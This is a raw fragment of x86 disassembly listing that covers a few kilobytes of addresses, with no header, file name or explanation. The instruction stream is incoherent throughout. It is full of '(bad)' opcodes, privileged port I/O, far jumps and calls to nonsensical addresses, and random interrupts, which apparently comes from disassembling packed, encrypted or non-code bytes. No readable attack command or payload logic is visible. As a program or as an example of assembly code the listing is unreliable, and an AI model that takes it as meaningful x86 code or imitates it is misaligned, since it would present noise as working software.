  409105:	mov    DWORD PTR [edx+0x34006eb0],esi
  40910b:	mov    ebp,0xcfcba8b5
  409110:	push   ecx
  409111:	and    ch,BYTE PTR [ebp-0x14a11b2d]
  409117:	mov    ss,WORD PTR [ecx+ecx*4+0x29]
  40911b:	xor    BYTE PTR [edx],bh
  40911d:	(bad)  
  40911f:	inc    esp
  409120:	xor    eax,0x989ba64b
  409125:	ret    0x38c
  409128:	mov    cl,BYTE PTR [edi-0x2d]
  40912b:	mov    dh,0xcc
  40912d:	leave  
  40912e:	lods   al,BYTE PTR ds:[esi]
  40912f:	shl    DWORD PTR [eax],0x41
  409132:	jge    0x409118
  409134:	in     al,0x13
  409136:	cmp    BYTE PTR [ebx-0x15],ch
  409139:	lea    ebx,[esp+ebx*4+0x3c]
  40913d:	xchg   esp,eax
  40913e:	mov    bl,0xa8
  409140:	push   es
  409141:	sbb    DWORD PTR ds:0xee00b130,edx
  409147:	ins    BYTE PTR es:[edi],dx
  409148:	cmp    ah,BYTE PTR [eax+0x25f7eabd]
  40914e:	mov    bh,0x35
  409150:	test   eax,0x33eceb83
  409155:	cmp    eax,0xbc844128
  40915a:	xchg   edx,eax
  40915b:	add    al,0x1f
  40915d:	outs   dx,BYTE PTR ds:[esi]
  40915e:	loope  0x4090ec
  409160:	or     ecx,DWORD PTR [ecx+0x6be1eeef]
  409166:	jge    0x40916f
  409168:	outs   dx,DWORD PTR ds:[esi]
  409169:	dec    esp
  40916a:	imul   edx,DWORD PTR [ecx],0x755e4ee8
  409170:	mov    bl,ah
  409172:	gs push ebx
  409174:	je     0x409114
  409176:	push   0x7
  409178:	push   edx
  409179:	push   ecx
  40917a:	inc    edi
  40917b:	ror    ecx,cl
  40917d:	sub    BYTE PTR [ecx-0xe],0xfa
  409181:	sbb    eax,0xcdff6f60
  409186:	mov    ds:0xa5b6ed2f,eax
  40918b:	xchg   esi,eax
  40918c:	sar    BYTE PTR [edi+0xf],0x66
  409190:	adc    al,dh
  409192:	hlt    
  409193:	mov    BYTE PTR [edi-0x66],dh
  409196:	xchg   ecx,eax
  409197:	and    BYTE PTR [ebx],bh
  409199:	scas   eax,DWORD PTR es:[edi]
  40919a:	jns    0x4091e6
  40919c:	add    cl,ch
  40919e:	dec    esp
  40919f:	retf   0xb5e5
  4091a2:	add    BYTE PTR [ebx-0x409380da],ah
  4091a8:	mov    bh,0x19
  4091aa:	fwait
  4091ab:	std    
  4091ac:	push   0x6c
  4091ae:	ret    
  4091af:	gs jbe 0x409196
  4091b2:	cmp    BYTE PTR [ecx-0x3e],dh
  4091b5:	shl    DWORD PTR [esi+0x56],0x13
  4091b9:	jl     0x4091e9
  4091bb:	(bad)  
  4091bd:	dec    ecx
  4091be:	jp     0x409174
  4091c0:	dec    ecx
  4091c1:	cwde   
  4091c2:	jno    0x409186
  4091c4:	xor    ecx,DWORD PTR [esi-0x412fd969]
  4091ca:	(bad)
  4091cf:	pop    esp
  4091d0:	jbe    0x40916e
  4091d2:	push   edi
  4091d3:	cli    
  4091d4:	mov    ebx,0x1b19cd87
  4091d9:	push   eax
  4091da:	or     al,0x85
  4091dc:	mov    dh,0xbf
  4091de:	sub    al,0x44
  4091e0:	popf   
  4091e1:	jmp    0x409163
  4091e3:	out    0x18,al
  4091e5:	jb     0x40920f
  4091e7:	ror    DWORD PTR [ecx-0x2a177ddc],cl
  4091ed:	pop    es
  4091ee:	not    bl
  4091f0:	outs   dx,BYTE PTR ds:[esi]
  4091f1:	in     al,0x52
  4091f3:	stos   DWORD PTR es:[edi],eax
  4091f4:	outs   dx,DWORD PTR ds:[esi]
  4091f5:	sbb    ch,BYTE PTR [ebx-0x80264a6]
  4091fb:	adc    bl,cl
  4091fd:	xor    DWORD PTR [ebp-0x5d0553a5],0xaa36575d
  409207:	jle    0x409202
  409209:	push   es
  40920a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40920b:	inc    esi
  40920c:	(bad)  
  40920d:	cmp    al,0x97
  40920f:	ins    BYTE PTR es:[edi],dx
  409210:	pop    es
  409211:	sar    BYTE PTR [ebx+esi*4],0x5
  409215:	push   eax
  409216:	pop    edi
  409217:	and    dh,BYTE PTR [esi]
  409219:	shl    BYTE PTR [eax-0x556fd89d],1
  40921f:	imul   edi,DWORD PTR [ebx-0x73],0xffffffd3
  409223:	or     esi,edx
  409225:	pop    es
  409226:	sti    
  409227:	and    DWORD PTR [esi+ebp*2-0xe],edx
  40922b:	sbb    ecx,DWORD PTR [edi-0x353ef00e]
  409231:	jmp    0x72fc200b
  409236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409237:	popf   
  409238:	ret    0x2105
  40923b:	in     al,dx
  40923c:	jmp    0xfe96fc06
  409241:	push   edx
  409242:	xchg   ebp,eax
  409243:	xchg   esp,eax
  409244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409245:	adc    dl,BYTE PTR [edx*2+0xc63c115]
  40924c:	jo     0x40926a
  40924e:	imul   ecx,ebp,0x3d
  409251:	and    eax,0xc4eb4f5c
  409256:	cmc    
  409257:	outs   dx,BYTE PTR ds:[esi]
  409258:	adc    eax,0xa4a10920
  40925d:	sub    dh,bl
  40925f:	fwait
  409260:	rcr    cl,1
  409262:	sub    al,0x2c
  409264:	pop    ebp
  409265:	sbb    BYTE PTR [edx+0xcba60b6],dh
  40926b:	cwde   
  40926c:	nop
  40926d:	sahf   
  40926e:	pop    edx
  40926f:	push   esp
  409270:	(bad)  
  409271:	ins    BYTE PTR es:[edi],dx
  409272:	cwde   
  409273:	rol    BYTE PTR [ebx-0x3601241a],0xbf
  40927a:	bound  ecx,QWORD PTR [esp+edx*8-0x38]
  40927e:	outs   dx,DWORD PTR ds:[esi]
  40927f:	(bad)  
  409280:	sub    edx,esi
  409282:	adc    BYTE PTR [eax],bl
  409284:	lahf   
  409285:	pop    edx
  409286:	push   cs
  409287:	lods   al,BYTE PTR ds:[esi]
  409288:	shl    DWORD PTR [esi],1
  40928a:	ins    BYTE PTR es:[edi],dx
  40928b:	jle    0x4092f9
  40928d:	in     al,dx
  40928e:	stos   DWORD PTR es:[edi],eax
  40928f:	ret    
  409290:	ins    DWORD PTR es:[edi],dx
  409291:	out    dx,al
  409292:	mov    ah,0xcd
  409294:	imul   esp,eax,0x4be15d7f
  40929a:	mov    WORD PTR [eax],?
  40929c:	xchg   edi,eax
  40929d:	dec    edi
  40929e:	add    eax,0x3a9c713e
  4092a3:	enter  0x3ed0,0x39
  4092a7:	adc    BYTE PTR [ecx+0x39],bh
  4092aa:	adc    eax,0x8834d898
  4092af:	jo     0x409238
  4092b1:	sub    al,0x7c
  4092b3:	je     0x40929c
  4092b5:	push   ss
  4092b6:	mov    dl,0x5e
  4092b8:	inc    edx
  4092b9:	out    dx,eax
  4092ba:	in     eax,dx
  4092bb:	ss call 0x8f0606bc
  4092c1:	add    DWORD PTR [edx+edi*1-0x77b96414],0x8
  4092c9:	aas    
  4092ca:	fiadd  DWORD PTR [edx-0x57]
  4092cd:	fcom   QWORD PTR [ebp-0x6c]
  4092d0:	fisub  DWORD PTR [ecx]
  4092d2:	push   edx
  4092d3:	adc    esp,ecx
  4092d5:	inc    ebx
  4092d6:	mov    DWORD PTR [esi+0x3d],0x2d5b3c5b
  4092dd:	jmp    0x409270
  4092df:	dec    edx
  4092e0:	xor    dl,dh
  4092e2:	aad    0x50
  4092e4:	fimul  DWORD PTR [esi+esi*2-0x2d]
  4092e8:	shl    DWORD PTR [esi],1
  4092ea:	sti    
  4092eb:	(bad)  
  4092ec:	rcr    eax,cl
  4092ee:	adc    DWORD PTR [edx-0x81c3fef],ebp
  4092f4:	iret   
  4092f5:	fcomp  DWORD PTR [ecx-0x761fadf4]
  4092fb:	jmp    0x4092f5
  4092fd:	stos   BYTE PTR es:[edi],al
  4092fe:	add    DWORD PTR [ebx],edi
  409300:	push   ebp
  409301:	lahf   
  409302:	frstor [ebp-0x3ba34253]
  409308:	mov    dh,0x8
  40930a:	aad    0x8f
  40930c:	jmp    0x409300
  40930e:	inc    edx
  40930f:	pop    es
  409310:	das    
  409311:	jle    0x409385
  409313:	rol    DWORD PTR [eax+0x2a],0x7f
  409317:	mov    WORD PTR [ebx+0x41],es
  40931a:	jno    0x40930d
  40931c:	loopne 0x4092f6
  40931e:	repnz push ds
  409320:	sub    DWORD PTR [eax+0x287b4780],esp
  409326:	push   edx
  409327:	mov    esp,0x1bcc8ea2
  40932c:	fwait
  40932d:	test   al,0x96
  40932f:	and    DWORD PTR [esi],0xbb10c6b0
  409335:	lods   al,BYTE PTR ds:[esi]
  409336:	and    al,0x3a
  409338:	ds inc esp
  40933a:	mov    ebp,0xf621a546
  40933f:	mov    dl,0xfe
  409341:	push   ebp
  409342:	push   edx
  409343:	dec    ebp
  409344:	jl     0x4092cb
  409346:	int    0x72
  409348:	push   ecx
  409349:	in     eax,dx
  40934a:	mov    BYTE PTR [ecx-0x1c2fc0b5],bh
  409350:	daa    
  409351:	js     0x40937e
  409353:	shr    BYTE PTR [eax+0x50],0x10
  409357:	test   ch,dh
  409359:	add    cl,dl
  40935b:	cmp    DWORD PTR [edi+esi*8-0x6090af88],0xffffffb7
  409363:	adc    al,BYTE PTR [edx+0x1b]
  409366:	sti    
  409367:	je     0x409351
  409369:	scas   al,BYTE PTR es:[edi]
  40936a:	add    BYTE PTR [edi+edx*2-0x4f],ch
  40936e:	(bad)  
  409370:	xor    al,0xab
  409372:	xor    al,0x76
  409374:	inc    ch
  409376:	mov    bh,0x3
  409378:	into   
  409379:	jmp    0xeb45:0x9975dac9
  409380:	sub    bh,BYTE PTR ds:0x66d648c3
  409386:	pop    ds
  409387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409388:	mov    ecx,0x124a093d
  40938d:	adc    dh,cl
  40938f:	int    0x8e
  409391:	(bad)  
  409392:	daa    
  409393:	and    BYTE PTR [ebp+edi*4-0x7c],ah
  409397:	mov    esp,0x3ec9d698
  40939c:	in     eax,dx
  40939d:	shl    BYTE PTR [ebx+0xe],1
  4093a0:	push   esp
  4093a1:	ret    
  4093a2:	mov    ch,0xb6
  4093a4:	fdiv   DWORD PTR [esi]
  4093a6:	pop    ebx
  4093a7:	push   DWORD PTR [edi+0x3a]
  4093aa:	test   al,0x18
  4093ac:	cmp    ebx,DWORD PTR [eax-0x10]
  4093af:	mov    ebp,0xa8a9b907
  4093b4:	in     eax,0xaf
  4093b6:	pop    ebx
  4093b7:	push   ss
  4093b8:	outs   dx,BYTE PTR ds:[esi]
  4093b9:	fistp  WORD PTR [ecx]
  4093bb:	stc    
  4093bc:	jb     0x409362
  4093be:	fisttp QWORD PTR [ecx+0x26]
  4093c1:	imul   ebp,DWORD PTR [eax+0x72ff306c],0x28
  4093c8:	add    bl,ch
  4093ca:	lea    eax,[ecx-0x1b]
  4093cd:	shl    DWORD PTR [ebp+0x1f07f3bb],cl
  4093d3:	pusha  
  4093d4:	dec    ebx
  4093d5:	jns    0x409376
  4093d7:	mov    dl,0x41
  4093d9:	xchg   ecx,eax
  4093da:	xor    BYTE PTR [ecx+0x68b55faa],ch
  4093e0:	ins    BYTE PTR es:[edi],dx
  4093e1:	cmp    ebp,ebp
  4093e3:	push   es
  4093e4:	mov    esi,0x20caf1e5
  4093e9:	mov    edx,0x6e782ecc
  4093ee:	or     DWORD PTR [ecx],edx
  4093f0:	jecxz  0x4093e5
  4093f2:	imul   ebx,DWORD PTR [ebp-0x3c0aa69],0xd3bf09c3
  4093fc:	inc    edx
  4093fd:	pop    edx
  4093fe:	push   0x8077936
  409403:	mov    esi,0x1a478dc0
  409408:	or     al,0x1d
  40940a:	inc    ebx
  40940b:	pop    eax
  40940c:	mov    esi,0x5063438d
  409411:	lahf   
  409412:	pop    eax
  409413:	call   0x94f:0x691667be
  40941a:	mov    BYTE PTR [ebx],ch
  40941c:	pop    edx
  40941d:	outs   dx,BYTE PTR ds:[esi]
  40941e:	sbb    BYTE PTR [ebp-0x40],bl
  409421:	mov    ebp,0x51fb4e42
  409426:	outs   dx,BYTE PTR ds:[esi]
  409427:	push   edi
  409428:	rcr    DWORD PTR [edi+eiz*8],cl
  40942b:	je     0x409449
  40942d:	or     esi,ebx
  40942f:	xor    BYTE PTR [ebp-0x5f221174],0x79
  409436:	sti    
  409437:	dec    ebx
  409438:	leave  
  409439:	xor    DWORD PTR [edi],ebp
  40943b:	push   ebp
  40943c:	mov    bh,0xd3
  40943e:	dec    esp
  40943f:	jl     0x4093f9
  409441:	ror    eax,0x9b
  409444:	dec    ecx
  409445:	mov    ah,0xa9
  409447:	in     eax,dx
  409448:	je     0x409443
  40944a:	arpl   WORD PTR [eax+0x50],sp
  40944d:	pop    es
  40944e:	fwait
  40944f:	je     0x409475
  409451:	adc    eax,0xe78195e0
  409456:	pop    esi
  409457:	mov    ds:0xf9186c6c,eax
  40945c:	mov    dh,BYTE PTR [ebx]
  40945e:	jmp    0x40947f
  409460:	imul   eax,DWORD PTR [ebp+0x2d],0x2aa64668
  409467:	pop    eax
  409468:	pop    ebx
  409469:	fdivr  DWORD PTR [esi-0x60a7e3d7]
  40946f:	jb     0x409462
  409471:	imul   ecx,DWORD PTR [edx+esi*8],0xa54228ff
  409478:	add    eax,0xdbbd7c93
  40947d:	loope  0x4094b7
  40947f:	(bad)  
  409480:	out    dx,al
  409481:	cmp    dl,BYTE PTR [edi-0x3f057e51]
  409487:	int    0xb
  409489:	lods   al,BYTE PTR ds:[esi]
  40948a:	cmp    al,0xb7
  40948c:	in     eax,0xa6
  40948e:	ds out 0xcf,eax
  409491:	int    0xd6
  409493:	fisttp DWORD PTR ds:0x44fad5dd
  409499:	xor    eax,0x66a1d108
  40949e:	loopne 0x4094da
  4094a0:	int    0xf0
  4094a2:	out    0xa5,al
  4094a4:	mov    al,0x68
  4094a6:	push   ss
  4094a7:	sar    DWORD PTR ds:0xfa0de73f,cl
  4094ad:	test   BYTE PTR [esi-0x218858b2],dl
  4094b3:	loope  0x409492
  4094b5:	inc    ecx
  4094b6:	arpl   cx,bx
  4094b8:	push   esp
  4094b9:	in     eax,dx
  4094ba:	out    0xf,eax
  4094bc:	mov    BYTE PTR [edi-0x62],ah
  4094bf:	shl    DWORD PTR ds:0x24d6ddb0,1
  4094c5:	jno    0x409493
  4094c7:	mov    dl,0xd1
  4094c9:	retf   0x837c
  4094cc:	dec    ebp
  4094cd:	and    eax,esp
  4094cf:	cmp    eax,0x111ae032
  4094d4:	cmp    al,0x9e
  4094d6:	sbb    al,0x21
  4094d8:	jmp    0xc898f593
  4094dd:	xchg   ecx,eax
  4094de:	push   esi
  4094df:	lahf   
  4094e0:	push   es
  4094e1:	adc    dh,BYTE PTR [edx+edi*1+0x11]
  4094e5:	cld    
  4094e6:	int    0xc3
  4094e8:	aam    0xbb
  4094ea:	push   0x68ed04fa
  4094ef:	pop    ds
  4094f0:	jg     0x4094f6
  4094f2:	das    
  4094f3:	fnstsw WORD PTR [edx-0x576d7781]
  4094f9:	ins    DWORD PTR es:[edi],dx
  4094fa:	mov    eax,0x3bc54bbb
  4094ff:	mov    eax,0x83cd8433
  409504:	xchg   esp,eax
  409505:	pop    es
  409506:	push   0xa
  409508:	sub    edi,DWORD PTR [edx+0x1f]
  40950b:	pushw  ds
  40950d:	pop    DWORD PTR es:[esi+0x3fa5a704]
  409514:	mov    cl,0xe6
  409516:	popf   
  409517:	or     eax,0x9dfc1533
  40951c:	test   bl,dl
  40951e:	pop    ebx
  40951f:	je     0x409563
  409521:	jecxz  0x40955b
  409523:	ins    DWORD PTR es:[edi],dx
  409524:	shl    BYTE PTR [edx-0x2],1
  409527:	jg     0x40951b
  409529:	pop    esi
  40952a:	in     al,0xa5
  40952c:	fisub  DWORD PTR ds:0x86cb0ccf
  409532:	(bad)  [esi+0x70]
  409535:	test   ebp,esp
  409537:	or     eax,0x3c48aed4
  40953c:	jle    0x40957f
  40953e:	jae    0x4094fb
  409540:	inc    ebx
  409541:	and    DWORD PTR [eax+0x28],edx
  409544:	dec    ecx
  409545:	or     al,0x9b
  409547:	icebp  
  409548:	push   esp
  409549:	loope  0x409556
  40954b:	jp     0x409580
  40954d:	ror    DWORD PTR [ebx*1+0x2f39065b],cl
  409554:	inc    edx
  409555:	(bad)  
  409556:	add    eax,0x866d9ab0
  40955b:	xor    eax,0x72403bf0
  409560:	test   eax,0x172dc31e
  409565:	je     0x4095da
  409567:	mov    esp,0x172ee48c
  40956c:	retw   0xeff2
  409570:	cli    
  409571:	scas   al,BYTE PTR es:[edi]
  409572:	sub    BYTE PTR [ecx+0x5e46cfc8],0x12
  409579:	cmp    al,0xd9
  40957b:	jmp    0x409564
  40957d:	xchg   ebp,eax
  40957e:	nop
  40957f:	aam    0x85
  409581:	rol    cl,cl
  409583:	sbb    eax,0xd26ce967
  409588:	xchg   esp,eax
  409589:	out    0xeb,eax
  40958b:	js     0x40952c
  40958d:	mov    ebx,0xef602eee
  409592:	enter  0x368c,0x9c
  409596:	sbb    eax,0x89b8668d
  40959b:	adc    BYTE PTR [edi],ch
  40959d:	adc    al,0xbc
  40959f:	inc    edi
  4095a0:	popa   
  4095a1:	sbb    eax,0xed2a86e0
  4095a6:	pop    edi
  4095a7:	in     eax,0x7a
  4095a9:	jns    0x409555
  4095ab:	(bad)  
  4095ad:	repz les edx,FWORD PTR [ecx+ecx*1]
  4095b1:	or     BYTE PTR [ecx],0x7b
  4095b4:	lods   eax,DWORD PTR ds:[esi]
  4095b5:	push   ebp
  4095b6:	xchg   esp,eax
  4095b7:	dec    edx
  4095b8:	clc    
  4095b9:	pop    ecx
  4095ba:	lods   eax,DWORD PTR ds:[esi]
  4095bb:	adc    ecx,ebx
  4095bd:	push   edi
  4095be:	xchg   ecx,eax
  4095bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c0:	pop    edi
  4095c1:	ffree  st(0)
  4095c3:	out    dx,eax
  4095c4:	js     0x409644
  4095c6:	aaa    
  4095c7:	adc    DWORD PTR [esi-0x2c],edx
  4095ca:	add    eax,0x922fbe38
  4095cf:	(bad)  
  4095d0:	dec    esi
  4095d1:	push   edi
  4095d2:	jecxz  0x40958f
  4095d4:	xor    eax,0x42376702
  4095d9:	aam    0xa1
  4095db:	push   eax
  4095dc:	aam    0x2a
  4095de:	test   BYTE PTR [di],bl
  4095e1:	shl    BYTE PTR [edi-0x26517db5],1
  4095e7:	xor    al,0x61
  4095e9:	aam    0x2b
  4095eb:	stc    
  4095ec:	cmp    DWORD PTR [eax+0x35],esp
  4095ef:	pop    ecx
  4095f0:	(bad)  
  4095f1:	cmc    
  4095f2:	pushf  
  4095f3:	and    DWORD PTR [ecx],ecx
  4095f5:	jns    0x40964a
  4095f7:	jns    0x409580
  4095f9:	mov    ah,0x21
  4095fb:	mov    ds:0x79e4c527,eax
  409600:	pop    es
  409601:	add    esi,DWORD PTR [ebx]
  409603:	push   ss
  409604:	les    esi,FWORD PTR [ebp+0x7e]
  409607:	adc    DWORD PTR [edx+0x7d],edx
  40960a:	push   ebp
  40960b:	sbb    BYTE PTR [esi+0x24],bh
  40960e:	sub    al,0x62
  409610:	push   ds
  409611:	js     0x409646
  409613:	mov    bh,0x49
  409615:	push   ecx
  409616:	mov    DWORD PTR [ebx+0x5a],esp
  409619:	jae    0x4095ff
  40961b:	inc    ecx
  40961c:	lods   eax,DWORD PTR ds:[esi]
  40961d:	pop    ss
  40961e:	in     eax,0xc2
  409620:	and    ebx,ebp
  409622:	pop    esp
  409623:	dec    ebp
  409624:	push   ebx
  409625:	add    cl,bl
  409627:	ret    
  409628:	and    eax,0xe3ad4a9e
  40962d:	xor    ebp,DWORD PTR [esi-0x4f]
  409630:	in     eax,dx
  409631:	mov    ch,0x97
  409633:	push   ecx
  409634:	ins    DWORD PTR es:[edi],dx
  409635:	jmp    0xe277:0x5c97a729
  40963c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40963d:	outs   dx,BYTE PTR ds:[esi]
  40963e:	cmp    ah,BYTE PTR [esp+ebx*4-0x4fa10f55]
  409645:	loop   0x409611
  409647:	sahf   
  409648:	leave  
  409649:	dec    ebx
  40964a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40964b:	rcr    BYTE PTR [eax+0x405efa6a],cl
  409651:	push   eax
  409652:	adc    DWORD PTR [ebx-0x66],ebp
  409655:	inc    ebx
  409656:	mov    eax,ds:0x378fbb0e
  40965b:	jb     0x4095e5
  40965d:	inc    eax
  40965e:	lods   al,BYTE PTR ds:[esi]
  40965f:	bound  eax,QWORD PTR [edi+0x7dd2893f]
  409665:	jns    0x40966e
  409667:	mul    DWORD PTR [edx]
  409669:	cs adc bh,dl
  40966c:	rol    DWORD PTR [eax+0x3975c2f3],0x95
  409673:	retf   
  409674:	jg     0x409664
  409676:	shl    BYTE PTR [ecx+0x7d158111],cl
  40967c:	push   0x30
  40967e:	push   ss
  40967f:	pusha  
  409680:	and    ecx,DWORD PTR [edx]
  409682:	xlat   BYTE PTR ds:[ebx]
  409683:	inc    esi
  409684:	sahf   
  409685:	fistp  WORD PTR [ebx+0x13]
  409688:	mov    cl,0xf
  40968a:	push   eax
  40968b:	int    0x1c
  40968d:	out    dx,eax
  40968e:	icebp  
  40968f:	fild   WORD PTR [ebx+0x24]
  409692:	pandn  mm4,QWORD PTR [eax]
  409695:	sub    eax,0x182b006b
  40969a:	shl    BYTE PTR [edi-0x30],cl
  40969d:	scas   eax,DWORD PTR es:[edi]
  40969e:	cmp    eax,0xcb567d44
  4096a3:	fneni(8087 only) 
  4096a5:	adc    al,0x2a
  4096a7:	dec    esp
  4096a8:	lahf   
  4096a9:	fcmovbe st,st(2)
  4096ab:	sbb    DWORD PTR [ecx-0x46],edi
  4096ae:	jmp    0x1a260a94
  4096b3:	push   edi
  4096b4:	or     ah,BYTE PTR [esi+0x654f4a50]
  4096ba:	ds fs ja 0x409643
  4096be:	or     eax,0xd97b1fb1
  4096c3:	and    edx,DWORD PTR [ecx]
  4096c5:	scas   eax,DWORD PTR es:[edi]
  4096c6:	das    
  4096c7:	arpl   WORD PTR ds:0xf5b93488,sp
  4096cd:	jb     0x40966e
  4096cf:	jns    0x40969b
  4096d1:	and    DWORD PTR [ebx],0x6b
  4096d4:	jg     0x4096a6
  4096d6:	mov    BYTE PTR [esi-0x4c],dh
  4096d9:	or     eax,esi
  4096db:	mov    dh,0xb7
  4096dd:	(bad)  
  4096de:	cmp    esi,esi
  4096e0:	loopne 0x409742
  4096e2:	cmp    BYTE PTR [esi-0x71cfd1f1],al
  4096e8:	ret    0x2212
  4096eb:	pop    edi
  4096ec:	jecxz  0x40976b
  4096ee:	jb     0x409757
  4096f0:	dec    ebx
  4096f1:	or     dh,dh
  4096f3:	mov    eax,ds:0xebe81e0e
  4096f8:	std    
  4096f9:	xor    DWORD PTR [ebp+0x6c651530],eax
  4096ff:	jo     0x4096ec
  409701:	fcomp  DWORD PTR [ebx-0x9]
  409704:	pop    edi
  409705:	jne    0x409774
  409707:	dec    ebx
  409708:	(bad)  
  409709:	xor    eax,0x27db15ba
  40970e:	aas    
  40970f:	xchg   esp,eax
  409710:	pop    esp
  409711:	cmp    BYTE PTR [edx],bl
  409713:	sub    edx,DWORD PTR [esi+0x2d]
  409716:	pop    edx
  409717:	xor    eax,0xb423dc2b
  40971c:	aam    0x33
  40971e:	cwde   
  40971f:	in     eax,dx
  409720:	push   es
  409721:	lds    ebx,FWORD PTR [ebx+edi*8+0x1e]
  409725:	fnstcw WORD PTR ds:0xfd161057
  40972b:	ret    
  40972c:	sub    cl,BYTE PTR [ebx+0x2df51fb4]
  409732:	fbld   TBYTE PTR [edx+edx*4-0x67]
  409736:	leave  
  409737:	ds mov cl,0x20
  40973a:	mov    WORD PTR [edi-0x7c],gs
  40973d:	xchg   esi,eax
  40973e:	dec    esp
  40973f:	test   al,0x6d
  409741:	push   ebp
  409742:	pop    ds
  409743:	repnz shl BYTE PTR [eax],1
  409746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409747:	pop    esp
  409748:	(bad)  
  409749:	push   edi
  40974a:	fld    DWORD PTR [esi+0x67]
  40974d:	(bad)  
  40974e:	cld    
  40974f:	pop    ecx
  409750:	sub    eax,0x67d1aee3
  409755:	push   ebx
  409756:	ret    0x69df
  409759:	(bad)  
  40975b:	dec    edi
  40975c:	sub    DWORD PTR [eax+0x49],edi
  40975f:	loope  0x40975c
  409761:	repnz popf 
  409763:	or     BYTE PTR [ebp+0x80cfbac],0xf4
  40976a:	adc    eax,0xe77af33a
  40976f:	pop    esp
  409770:	leave  
  409771:	shl    BYTE PTR [ebx],0xc7
  409774:	(bad)  
  409775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409776:	inc    ecx
  409777:	stos   DWORD PTR es:[edi],eax
  409778:	pop    ebx
  409779:	jg     0x4097d9
  40977b:	imul   esp,DWORD PTR [esi-0x754e6967],0x7f
  409782:	jmp    0x40976f
  409784:	ror    DWORD PTR fs:[ecx+0x17],0x55
  409789:	push   es
  40978a:	sbb    BYTE PTR [esi+edi*1+0x5abcb342],0x11
  409792:	ja     0x409772
  409794:	dec    ebp
  409795:	sbb    bl,cl
  409797:	not    DWORD PTR [ecx]
  409799:	int    0x8f
  40979b:	pop    edi
  40979c:	into   
  40979d:	pushf  
  40979e:	clc    
  40979f:	sub    DWORD PTR [ebx-0x4ab54a4c],0xffffffc7
  4097a6:	xor    DWORD PTR [edi+eiz*1],ebx
  4097a9:	xchg   DWORD PTR [ebp+0x70e38820],eax
  4097af:	adc    BYTE PTR [ecx],cl
  4097b1:	retf   
  4097b2:	xchg   ebp,eax
  4097b3:	add    ch,BYTE PTR [ebx-0x10a151bf]
  4097b9:	sbb    eax,0x6fa80c61
  4097be:	adc    dl,BYTE PTR [ebx]
  4097c0:	or     ch,BYTE PTR [edx-0x74]
  4097c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c4:	inc    eax
  4097c5:	ds adc eax,0x89b5037b
  4097cb:	in     eax,0x94
  4097cd:	outs   dx,BYTE PTR ds:[esi]
  4097ce:	adc    eax,0x43402d6f
  4097d3:	cld    
  4097d4:	xchg   edi,eax
  4097d5:	popa   
  4097d6:	cdq    
  4097d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d8:	and    ebx,ecx
  4097da:	push   ss
  4097db:	lds    ecx,FWORD PTR [ebx-0x86ab642]
  4097e1:	adc    bl,BYTE PTR [esi+0x509b9f1]
  4097e7:	lahf   
  4097e8:	mov    al,ds:0x2e45d7c7
  4097ed:	sti    
  4097ee:	(bad)  
  4097ef:	stc    
  4097f0:	sub    al,dl
  4097f2:	sub    ebx,DWORD PTR [eax-0x70]
  4097f5:	mov    DWORD PTR [ebp+ecx*4+0x365c00c0],eax
  4097fc:	mov    edi,DWORD PTR [ecx+0x7d]
  4097ff:	stos   DWORD PTR es:[edi],eax
  409800:	loop   0x409816
  409802:	or     eax,0x92910f2c
  409807:	or     BYTE PTR [ebp+0x71671514],al
  40980d:	jmp    0x862962f6
  409812:	and    ch,BYTE PTR [ecx]
  409814:	(bad)  
  409815:	out    0x7c,eax
  409817:	mov    dl,0xe7
  409819:	leave  
  40981a:	hlt    
  40981b:	pop    ds
  40981c:	xchg   esi,eax
  40981d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981e:	sub    eax,0xdcabbfb0
  409823:	les    esp,FWORD PTR [ebx+0x659bf51e]
  409829:	jecxz  0x40986e
  40982b:	ss mov dh,0x68
  40982e:	test   DWORD PTR [esi],eax
  409830:	xchg   esi,eax
  409831:	fadd   st,st(4)
  409833:	push   ss
  409834:	xlat   BYTE PTR ds:[ebx]
  409835:	inc    edx
  409836:	adc    dl,BYTE PTR [esi+0x2e]
  409839:	cmp    DWORD PTR [edi],eax
  40983b:	mov    eax,0x6b99c1e9
  409840:	pushf  
  409841:	clc    
  409842:	add    al,0xb5
  409844:	jge    0x40986b
  409846:	or     esp,esi
  409848:	dec    ebp
  409849:	fidivr DWORD PTR [eax-0x2b07b0a5]
  40984f:	in     al,0x57
  409851:	xor    bl,0xbc
  409854:	dec    ecx
  409855:	pop    ebp
  409856:	mov    dl,0x1a
  409858:	cs (bad) 
  40985b:	shl    DWORD PTR [esi+0x36e3f025],0xd
  409862:	mov    ecx,0xad93b550
  409867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409868:	jnp    0x4098b8
  40986a:	add    BYTE PTR ds:0xf35d1c03,cl
  409870:	in     al,0xb1
  409872:	add    DWORD PTR [ebp-0x33],eax
  409875:	retf   0xe416
  409878:	inc    ecx
  409879:	sbb    eax,0xaf6d30f4
  40987e:	push   ss
  40987f:	and    BYTE PTR [ebx+0x12c26ea7],bl
  409885:	sub    edx,DWORD PTR [edx-0x23]
  409888:	push   edi
  409889:	les    ebp,FWORD PTR [ebp-0x6568460a]
  40988f:	adc    DWORD PTR [ecx+edx*4],0xa895751d
  409896:	pop    edx
  409897:	sub    BYTE PTR [ecx-0x5f],0x77
  40989b:	iret   
  40989c:	inc    ebx
  40989d:	mov    eax,DWORD PTR [ecx]
  40989f:	pop    edi
  4098a0:	mov    al,ds:0xfd07a500
  4098a5:	pop    es
  4098a6:	jae    0x409924
  4098a8:	dec    esi
  4098a9:	sbb    ah,BYTE PTR ds:0x9d2398a2
  4098af:	xchg   ebp,eax
  4098b0:	sbb    eax,0x86dd7d9a
  4098b5:	retf   
  4098b6:	mov    edi,0xd1c833e4
  4098bb:	dec    ebp
  4098bc:	aad    0x95
  4098be:	add    ebp,DWORD PTR [esi+0x637c767e]
  4098c4:	ret    
  4098c5:	or     eax,0x63d32201
  4098ca:	push   0x9151379c
